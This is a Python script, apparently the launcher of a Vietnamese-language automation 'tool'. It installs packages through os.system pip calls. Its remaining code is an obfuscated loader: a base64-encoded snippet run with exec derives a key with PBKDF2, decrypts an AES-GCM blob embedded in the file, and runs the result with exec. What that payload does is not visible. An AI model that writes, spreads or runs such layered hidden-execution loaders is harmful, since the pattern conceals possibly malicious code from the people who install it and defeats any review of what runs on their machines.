#!/usr/bin/env python3
#!/usr/bin/env python3
import os
import sys
import importlib.util

# Danh sách các thư viện cần cài đặt
REQUIRED_LIBRARIES = [
    'cryptography','requests', 'bs4', 'curl_cffi', 'tabulate', 'beautifulsoup4',
    'uiautomator2', 'colorama', 'pystyle', 'termcolor'
]

# File flag để kiểm tra xem đã cài đặt thư viện chưa
FLAG_FILE = "libraries_installed.txt"

# Hàm kiểm tra và cài đặt thư viện
def install_libraries():
    if not os.path.exists(FLAG_FILE):
        print("Lần đầu chạy tool, đang cài đặt các thư viện cần thiết...")
        for lib in REQUIRED_LIBRARIES:
            if not importlib.util.find_spec(lib):
                print(f"Đang cài đặt {lib}...")
                os.system(f"pip install {lib} --break-system-packages")
        
        # Tạo file flag để đánh dấu đã cài đặt
        with open(FLAG_FILE, 'w') as f:
            f.write("Libraries installed")
        print("✅ Tất cả thư viện đã được cài đặt thành công.")
        print("✅ Vui lòng vào lại tool!.")
        print("✅ Gõ lệnh : python H-Tool.py")
        exit()
    else:
        print("Thư viện đã được cài đặt từ trước, tiếp tục chạy tool...")

# Kiểm tra và cài đặt thư viện
install_libraries()

import base64
from hashlib import pbkdf2_hmac
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
encrypted_data = 'MTkxZjU2NjkzMmY4NTE1MjU5NjllZWZkM2I5Njc3OGU5MjMyYjRhMWNlZjI1YjRjNDc2ZDIwMzE3MDc2OGNhMvAMMp7vuCNbquSm8/07nP4Vmvz3Vgn02jqAlIeyz5E/lwGYEgeg1uXe7KPpsHMCMCTDbMNlIA59pq9/fi5VPkVIo01eds5boZpCSdtsPt/4kuYleUglciWKnp61ROLv+4IGTfXrBE49vom+yfJBH3FBm64BdAcQrvxDyhxPh5zhr6s92PnhdSeEaGFGzWhHAhR99z/SNezQTcUARE6u4yxGRJ/9Cii51vCANHf6YqAM24IceO8V9ydBP2+6iIRiVmUq4fTTxJlMgLr7tFd6FrOP03rQO1HGFmoLrxgaEJG9wTWI29zsFNFUk8DRRWDW89o0JS0Q0wpsrTX4WSrLJThnU2+aebM51D0RifSMqHH9DZk811TFvxuuL/BLUJ4iHV0aQoivHibBZQlVLkzN4FOTrH3jLpcftRxwyVnT0U2zi1hwRXzFlaMGf7sXez6pAha8TBQw8aG4zThWgsy+hq+dObmu0zm5TaLzUoXsSwbTfGrt7DRywRNIORZZt9UKCnjL1lwdTi1TkqK1ASLFzcq0T8oCFyUrmvCYcYW87etO2G1UDETh/fz3YtUHmAtjfTIW9pRwJm+HzY0QjCt5mPCgDlX2Itm+/Xv4Hw9lFWIEFbKs7SDsL2nAA65xBUoYG5/yR+smDQpZhT3Iu1XoRHDV7izmo3jVuKwmBJFM8c/f9i+qF2MUL9VYC/8t+Mz68Q6Y7lVac+wHFsvyG02GNmL5zy49VbeRo5vtJGEK5CemLnQPzoiZRQOB94csdUSLA72BWdTV/+BmA++NODL+ahmXdMmfhRakV+5nh9qT2TDzKbZHMrsR8BGi7CC2I0ttRKOJ8c/iS5TZyBIYnwT6IJpRFDLy2HllKZuumXMm3N96nFfZte4w2eMiRMylRzpQhSuAiI0uqKEcReqVr7f6W2eZYDNlsntHtwalx+1Z44ehM1be/lkovcJTsin/feX62A5D0D+5dB1JKabTJ1GyJEe8gXCohe/JHNklTbwc+/06OPn6DLNI3/khzqsYgrT6Ku+9pIw2ko7Hlhs095gXRVDPz67riertB+yoJRdb1fAIONbbC+bb7IqHhgUKpjIiz0a4gCA/ZzldWsQJx1M+BQf5WH1IML8RQOfS8JEsnkYR15vlf1E2IU6MuXIS0nG/qys9hqRmvMr63s4bbmOx0EvTl6kJAev5uLJpKHnOO0cE9URhBEBTePkey2P5kuKYiAt90jgqJ3on0o+vAPKxJcC7WkBpj12hmZjjgdOwDfMiaMBHBqv/3+SrJAoOTwLqkBUvMQV/HO8emx+YSf9/q8wu4BVsMDvShw7Milhn+pvcSu54zol7L6lYz3mfGBX3E60Ye9b6+RRFYFPzTSYH3fSKc1miz/CjTt4cJqbe1/9L'
exec(base64.b64decode('aGlkZGVuX2tleXMgPSB7J2tleSc6ICdiMWQ4ZTFkOGE3Mjg4MDg2NTdkNDc3OGVjOWY2MmJhZDcxYjM2NzcxODcyYTg2YzFjNDFiZGI4MGM5ZGFkNTExJywgJ3NhbHQnOiAnMTkxZjU2NjkzMmY4NTE1MjU5NjllZWZkM2I5Njc3OGU5MjMyYjRhMWNlZjI1YjRjNDc2ZDIwMzE3MDc2OGNhMid9CnRyeToKICAgIHJhd19kYXRhID0gYmFzZTY0LmI2NGRlY29kZShlbmNyeXB0ZWRfZGF0YSkKICAgIHNhbHRfbGVuZ3RoID0gNjQKICAgIGl2X2xlbmd0aCA9IDEyCiAgICBzYWx0ID0gcmF3X2RhdGFbOnNhbHRfbGVuZ3RoXQogICAgaXYgPSByYXdfZGF0YVtzYWx0X2xlbmd0aDpzYWx0X2xlbmd0aCArIGl2X2xlbmd0aF0KICAgIGNpcGhlcnRleHQgPSByYXdfZGF0YVtzYWx0X2xlbmd0aCArIGl2X2xlbmd0aDpdCiAgICBkZXJpdmVkX2tleSA9IHBia2RmMl9obWFjKCdzaGE1MTInLCBoaWRkZW5fa2V5c1sna2V5J10uZW5jb2RlKCd1dGYtOCcpLCBoaWRkZW5fa2V5c1snc2FsdCddLmVuY29kZSgndXRmLTgnKSwgMTAwMDAsIDY0KQogICAgYWVzZ2NtID0gQUVTR0NNKGRlcml2ZWRfa2V5WzozMl0pCiAgICBkZWNyeXB0ZWQgPSBhZXNnY20uZGVjcnlwdChpdiwgY2lwaGVydGV4dCwgTm9uZSkKICAgIGV4ZWMoZGVjcnlwdGVkLmRlY29kZSgndXRmLTgnKSkKZXhjZXB0IEV4Y2VwdGlvbjoKICAgIHByaW50KCJDcml0aWNhbCBlcnJvciBkdXJpbmcgZGVjcnlwdGlvbi4iKQogICAgZXhpdCgxKQo=').decode('utf-8'))
